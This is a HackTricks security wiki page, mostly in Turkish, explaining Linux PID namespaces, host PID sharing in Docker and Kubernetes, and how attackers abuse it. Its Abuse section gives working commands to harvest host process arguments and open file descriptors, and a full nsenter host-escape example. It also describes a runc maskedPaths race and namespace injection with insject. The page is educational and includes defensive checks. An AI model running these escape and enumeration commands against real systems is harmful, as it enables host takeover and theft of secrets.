# PID Namespace

{{#include ../../../../../banners/hacktricks-training.md}}

## Genel Bakış

PID namespace, süreçlerin nasıl numaralandırıldığını ve hangi süreçlerin görünür olduğunu kontrol eder. Bu yüzden bir konteyner gerçek bir makine olmamasına rağmen kendi PID 1'ine sahip olabilir. İsim alanının içinde workload, yerel bir süreç ağacı gibi görünen şeyi görür. İsim alanının dışında ise host hâlâ gerçek host PID'lerini ve tam süreç manzarasını görür.

Güvenlik açısından PID namespace önemlidir çünkü süreç görünürlüğü değerlidir. Bir workload host süreçlerini görebildiğinde, servis isimlerini, komut satırı argümanlarını, süreç argümanlarında geçirilen sırları, `/proc` üzerinden türetilen ortam durumunu ve potansiyel isim alanı giriş hedeflerini gözlemleyebilir. Eğer sadece bu süreçleri görmekten daha fazlasını yapabiliyorsa — örneğin uygun koşullarda sinyal gönderme veya ptrace kullanma gibi — sorun çok daha ciddi hale gelir.

## İşleyiş

Yeni bir PID namespace kendi iç süreç numaralandırmasıyla başlar. İçinde oluşturulan ilk süreç, namespace açısından PID 1 olur; bu aynı zamanda yetim çocuklar ve sinyal davranışı için özel init-benzeri semantiklere sahip olduğu anlamına gelir. Bu, konteynerlerde init süreçleri, zombie reaping ve neden küçük init sarıcıların bazen konteynerlerde kullanıldığı gibi pek çok garipliği açıklar.

Önemli güvenlik dersi şudur: bir süreç sadece kendi PID ağacını gördüğü için izole görünebilir, ancak bu izolasyon kasıtlı olarak ortadan kaldırılabilir. Docker bunu `--pid=host` ile açarken, Kubernetes bunu `hostPID: true` ile yapar. Konteyner host PID namespace'ine katıldığında, workload host süreçlerini doğrudan görür ve pek çok sonraki saldırı yolu çok daha gerçekçi hale gelir.

## Laboratuvar

To create a PID namespace manually:
```bash
sudo unshare --pid --fork --mount-proc bash
ps -ef
echo $$
```
Shell artık özel bir process görünümü görür. `--mount-proc` flag'i önemlidir çünkü yeni PID namespace ile eşleşen bir procfs instance'ını mount eder, içeriden process list'in tutarlı olmasını sağlar.

Container davranışını karşılaştırmak için:
```bash
docker run --rm debian:stable-slim ps -ef
docker run --rm --pid=host debian:stable-slim ps -ef | head
```
The difference is immediate and easy to understand, which is why this is a good first lab for readers.

## Runtime Usage

Normal containers in Docker, Podman, containerd, and CRI-O get their own PID namespace. Kubernetes Pods usually also receive an isolated PID view unless the workload explicitly asks for host PID sharing. LXC/Incus environments rely on the same kernel primitive, though system-container use cases may expose more complicated process trees and encourage more debugging shortcuts.

## Misconfigurations

The canonical misconfiguration is host PID sharing. Teams often justify it for debugging, monitoring, or service-management convenience, but it should always be treated as a meaningful security exception. Even if the container has no immediate write primitive over host processes, visibility alone can reveal a lot about the system. Once capabilities such as `CAP_SYS_PTRACE` or useful procfs access are added, the risk expands significantly.

Another mistake is assuming that because the workload cannot kill or ptrace host processes by default, host PID sharing is therefore harmless. That conclusion ignores the value of enumeration, the availability of namespace-entry targets, and the way PID visibility combines with other weakened controls.

## Abuse

If the host PID namespace is shared, an attacker may inspect host processes, harvest process arguments, identify interesting services, locate candidate PIDs for `nsenter`, or combine process visibility with ptrace-related privilege to interfere with host or neighboring workloads. In some cases, simply seeing the right long-running process is enough to reshape the rest of the attack plan.

The first practical step is always to confirm that host processes are really visible:
```bash
readlink /proc/self/ns/pid
ps -ef | head -n 50
ls /proc | grep '^[0-9]' | head -n 20
```
Host PID'leri görünür hale geldiğinde, process arguments ve namespace-entry hedefleri genellikle en faydalı bilgi kaynağı haline gelir:
```bash
for p in 1 $(pgrep -n systemd 2>/dev/null) $(pgrep -n dockerd 2>/dev/null); do
echo "PID=$p"
tr '\0' ' ' < /proc/$p/cmdline 2>/dev/null; echo
done
```
Eğer `nsenter` mevcutsa ve yeterli ayrıcalık varsa, görünür bir host işleminin namespace köprüsü olarak kullanılıp kullanılamayacağını test edin:
```bash
which nsenter
nsenter -t 1 -m -u -n -i -p sh 2>/dev/null || echo "nsenter blocked"
```
Giriş engellense bile, host PID sharing zaten değerlidir; servis düzenini, çalışma zamanı bileşenlerini ve bir sonraki hedeflenecek aday ayrıcalıklı süreçleri ortaya çıkarır.

Host PID görünürlüğü ayrıca file-descriptor abuse'ı daha gerçekçi kılar. Eğer ayrıcalıklı bir host process veya komşu workload hassas bir dosya ya da socket açık tutuyorsa, saldırgan `/proc/<pid>/fd/`'yi inceleyip sahiplik, procfs mount options ve hedef servis modeline bağlı olarak o handle'ı yeniden kullanabilir.
```bash
for fd_dir in /proc/[0-9]*/fd; do
ls -l "$fd_dir" 2>/dev/null | sed "s|^|$fd_dir -> |"
done
grep " /proc " /proc/mounts
```
Bu komutlar yararlıdır çünkü `hidepid=1` veya `hidepid=2`'nin süreçler arası görünürlüğü azaltıp azaltmadığını ve örneğin açık durumdaki gizli dosyalar, loglar veya Unix soketleri gibi bariz şekilde ilgi çekici dosya tanımlayıcılarının hiç görünür olup olmadığını gösterir.

### Tam Örnek: host PID + `nsenter`

Host PID paylaşımı, süreç ayrıca host namespace'lerine katılmak için yeterli ayrıcalığa sahipse doğrudan bir host escape haline gelir:
```bash
ps -ef | head -n 50
capsh --print | grep cap_sys_admin
nsenter -t 1 -m -u -n -i -p /bin/bash
```
Komut başarılı olursa, container süreci artık host mount, UTS, network, IPC ve PID namespaces içinde çalışıyor. Etki derhal host'un ele geçirilmesidir.

Even when `nsenter` itself is missing, the same result may be achievable through the host binary if the host filesystem is mounted:
```bash
/host/usr/bin/nsenter -t 1 -m -u -n -i -p /host/bin/bash 2>/dev/null
```
### Son Çalışma Zamanı Notları

Bazı PID-namespace ile ilgili saldırılar geleneksel `hostPID: true` yanlış yapılandırmaları değil, container kurulumu sırasında procfs korumalarının uygulanma şeklindeki çalışma zamanı (runtime) uygulama hatalarıdır.

#### `maskedPaths` ile host procfs arasında yarış

Etkilenebilir `runc` sürümlerinde, container imajını veya `runc exec` iş yükünü kontrol edebilen saldırganlar, container tarafındaki `/dev/null`'ü `/proc/sys/kernel/core_pattern` gibi hassas bir procfs yoluna işaret eden bir symlink ile değiştirerek masking aşaması için yarışabilirler. Eğer yarış başarılı olursa, masked-path bind mount yanlış hedefe yerleşebilir ve host genelindeki procfs ayarlarını yeni container'a açığa çıkarabilir.

İnceleme için faydalı komut:
```bash
jq '.linux.maskedPaths' config.json 2>/dev/null
```
Bu önemlidir çünkü nihai etki, doğrudan procfs maruziyetiyle aynı olabilir: yazılabilir `core_pattern` veya `sysrq-trigger`, ardından host üzerinde kod yürütme veya denial of service.

#### `insject` ile Namespace injection

Namespace injection araçları, ör. `insject`, PID-namespace etkileşiminin her zaman hedef namespace'e işlem oluşturulmadan önce girilmesini gerektirmediğini gösterir. Bir yardımcı daha sonra bağlanabilir, `setns()` kullanabilir ve hedef PID alanına görünürlüğü koruyarak çalıştırabilir:
```bash
sudo insject -S -p $(pidof containerd-shim) -- bash -lc 'readlink /proc/self/ns/pid && ps -ef'
```
Bu tür bir teknik, çoğunlukla gelişmiş hata ayıklama, offensive tooling ve post-exploitation iş akışları için önemlidir; bu senaryolarda namespace bağlamına, runtime iş yükü başlatıldıktan sonra katılmak gerekebilir.

### İlgili FD Suistimal Kalıpları

Host PID'leri görünür olduğunda açıkça belirtilmeye değer iki kalıp vardır. Birincisi, ayrıcalıklı bir süreç, `execve()` sırasında `O_CLOEXEC` olarak işaretlenmediği için hassas bir file descriptor'ı açık tutabilir. İkincisi, servisler `SCM_RIGHTS` üzerinden Unix sockets aracılığıyla file descriptor'lar geçirebilir. Her iki durumda da ilginç nesne artık pathname değil, daha düşük ayrıcalıklı bir sürecin miras alabileceği veya alacağı zaten açık handle'dır.

Bu, container çalışmalarında önemlidir çünkü handle `docker.sock`, ayrıcalıklı bir log, host secret file veya yolun kendisi container filesystem'ten doğrudan erişilebilir olmasa bile başka yüksek değerli bir nesneye işaret edebilir.

## Kontroller

Bu komutların amacı, sürecin özel bir PID görünümüne sahip olup olmadığını yoksa çok daha geniş bir süreç manzarasını zaten listeleyip listeleyemeyeceğini belirlemektir.
```bash
readlink /proc/self/ns/pid   # PID namespace identifier
ps -ef | head                # Quick process list sample
ls /proc | head              # Process IDs and procfs layout
```
Burada ilginç olanlar:

- Eğer işlem listesi bariz host servisleri içeriyorsa, host PID sharing muhtemelen zaten etkindir.
- Sadece küçük bir container-local ağaç görmek normal başlangıç durumudur; `systemd`, `dockerd` veya ilgisiz daemon'ları görmek normal değildir.
- Host PIDs görünür hale geldiğinde, salt-okunur işlem bilgileri bile faydalı keşif bilgisine dönüşür.

Eğer host PID sharing ile çalışan bir konteyner keşfederseniz, bunu kozmetik bir fark olarak değerlendirmeyin. Bu, iş yükünün gözlemleyebileceği ve potansiyel olarak etkileyebileceği şeylerde büyük bir değişikliktir.
{{#include ../../../../../banners/hacktricks-training.md}}
